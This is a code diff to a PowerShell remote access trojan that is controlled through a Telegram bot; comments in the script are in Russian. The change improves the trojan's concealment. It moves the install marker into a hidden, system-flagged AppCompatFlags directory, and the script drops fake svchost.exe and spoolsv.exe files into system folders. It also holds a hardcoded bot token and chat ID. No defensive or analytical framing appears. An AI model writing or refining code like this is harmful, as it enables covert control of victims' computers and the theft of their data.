@@ -1,4 +1,4 @@
-# RAT через Telegram Bot - МАСКИРОВАННАЯ ВЕРСИЯ
+# RAT через Telegram Bot - УЛУЧШЕННАЯ МАСКИРОВКА
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
 
@@ -190,7 +190,7 @@ function Invoke-Cleanup {
         "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
         "$env:TEMP\rat_installed.marker",
         "$env:WINDIR\System32\System32Logs\svchost.exe",
-        "$env:TEMP\windows_update.marker",
+        "$env:PROGRAMDATA\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted\windows_update.marker",
         "$env:TEMP\TelegramUpload\*"
     )
 
@@ -259,12 +259,19 @@ $($regEntries -join "`n")
 }
 
 # Установка в автозагрузку с улучшенной маскировкой
-$installMarker = "$env:TEMP\windows_update.marker"
+# НОВОЕ МЕСТО ДЛЯ МАРКЕРА - системная папка AppCompatFlags
+$installMarkerDir = "$env:PROGRAMDATA\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted"
+if (!(Test-Path $installMarkerDir)) {
+    New-Item -Path $installMarkerDir -ItemType Directory -Force | Out-Null
+    attrib +s +h +r "$installMarkerDir" 2>&1 | Out-Null
+}
+$installMarker = "$installMarkerDir\windows_update.marker"
 
 # Проверяем, не установлен ли уже RAT
 if (!(Test-Path $installMarker)) {
     # Создаем маркер установки с безобидным именем
     "Windows Update Helper - $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
+    attrib +s +h +r "$installMarker" 2>&1 | Out-Null
     
     # Новая скрытая папка в системной директории
     $hiddenFolder = "$env:WINDIR\System32\System32Logs"
